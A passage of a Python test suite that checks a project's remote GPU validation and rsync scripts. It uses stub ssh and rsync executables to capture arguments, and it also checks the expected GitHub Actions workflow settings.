        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    empty = "__VELA_EMPTY__"
    assert args[-12:] == [
        "/srv/vela",
        "1800",
        "auto",
        "/tank/venvs/vela",
        empty,
        "pip",
        "vllm==0.11.2",
        "real-build-smoke",
        "real-model-smoke",
        "hf-internal-testing/tiny-random-LlamaForCausalLM",
        empty,
        "main",
    ]
    assert 'remote_build_method="$(_remote_arg_or_empty "${6:-pip}")"' in remote_script
    assert '"$venv_bin/vela" build add' in remote_script
    assert '--method "$remote_build_method"' in remote_script
    assert '--spec "$remote_build_spec"' in remote_script
    assert '"$venv_bin/vela" build verify "$remote_build_label"' in remote_script
    assert '"$venv_bin/vela" model pin "$remote_model_id"' in remote_script
    assert '--repo-id "$remote_model_repo"' in remote_script
    assert '"$venv_bin/vela" model download "$remote_model_ref"' in remote_script
    assert '"$venv_bin/vela" model verify "$remote_model_ref"' in remote_script


def test_remote_validation_writes_dated_artifact(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    artifact_dir = tmp_path / "artifacts"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
                'echo "REMOTE_OK from $1"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_ARTIFACT_DIR=str(artifact_dir),
        VELA_REMOTE_ARTIFACT_NAME="2026-06-04-gpu-host-smoke.md",
    )

    result = subprocess.run(
        [
            "bash",
            "scripts/run_remote_tests.sh",
            "gpu-host",
            "/srv/vela",
            "real-config",
        ],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    artifact = artifact_dir / "2026-06-04-gpu-host-smoke.md"
    assert artifact.exists()
    artifact_text = artifact.read_text(encoding="utf-8")
    assert "# Vela Remote Validation" in artifact_text
    assert "Host: `gpu-host`" in artifact_text
    assert "Remote path: `/srv/vela`" in artifact_text
    assert "Real config: `real-config`" in artifact_text
    assert "REMOTE_OK from gpu-host" in artifact_text
    assert "Exit status: `0`" in artifact_text
    assert f"remote validation artifact: {artifact}" in result.stderr


def test_remote_validation_model_only_uses_nonempty_ssh_placeholders(
    tmp_path: Path,
) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_MODEL_ID="real-model-smoke",
        VELA_REMOTE_MODEL_REPO="sshleifer/tiny-gpt2",
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    empty = "__VELA_EMPTY__"
    assert args[-12:] == [
        "/srv/vela",
        "1800",
        "auto",
        "/tank/venvs/vela",
        empty,
        "pip",
        empty,
        "remote-smoke-build",
        "real-model-smoke",
        "sshleifer/tiny-gpt2",
        empty,
        empty,
    ]
    assert 'empty_arg="__VELA_EMPTY__"' in remote_script
    assert "_remote_arg_or_empty" in remote_script


def test_manual_remote_validation_workflow_executes_script_and_uploads_artifact() -> None:
    workflow = Path(".github/workflows/remote-validation.yml")

    assert workflow.exists()
    text = workflow.read_text(encoding="utf-8")
    assert "workflow_dispatch:" in text
    assert "schedule:" in text
    assert "concurrency:" in text
    assert "runner_label" in text
    assert 'default: "self-hosted"' in text
    assert "remote_target" in text
    assert "real_resume_config" in text
    assert "gated_model_repo" in text
    assert "tiny-random-llama-detached-blackbird" in text
    assert "VELA_REMOTE_REAL_RESUME_CONFIG" in text
    assert "VELA_REMOTE_GATED_MODEL_REPO" in text
    assert "VELA_REMOTE_TARGET" in text
    assert "ssh-agent -s" in text
    assert "ssh-add \"$key_path\"" in text
    assert "VELA_SSH_OPTS=-A -i $key_path" in text
    assert "scripts/run_remote_tests.sh" in text
    assert "VELA_REMOTE_ARTIFACT_DIR" in text
    assert "actions/upload-artifact" in text
    assert "remote-validation-artifacts" in text


def test_remote_validation_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
    )

    subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
        check=True,
        capture_output=True,
        text=True,
        env=env,
    )

    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    assert args[:5] == ["-i", "/tmp/gpu-key", "-o", "BatchMode=yes", "gpu-host"]
    assert args[-4:] == ["/srv/vela", "1800", "auto", "/tank/venvs/vela"]


def test_remote_validation_accepts_zfs_venv_override(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_VENV="/tank/venvs/custom-vela",
    )

    subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
        check=True,
        capture_output=True,
        text=True,
        env=env,
    )

    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    assert args[-4:] == ["/srv/vela", "1800", "auto", "/tank/venvs/custom-vela"]


def test_rsync_to_gpu_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "rsync.args"
    rsync = bin_dir / "rsync"
    rsync.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${RSYNC_CAPTURE}"',
            ]
        ),
        encoding="utf-8",
    )
    rsync.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        RSYNC_CAPTURE=str(capture),
        VELA_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
    )

    subprocess.run(
        ["bash", "scripts/rsync_to_gpu.sh", "gpu-host:/srv/vela"],
        check=True,
        capture_output=True,
        text=True,
        env=env,
    )

    args = capture.read_text(encoding="utf-8").splitlines()
    rsh_index = args.index("--rsh")
    assert args[rsh_index + 1] == "ssh -i /tmp/gpu-key -o BatchMode=yes"
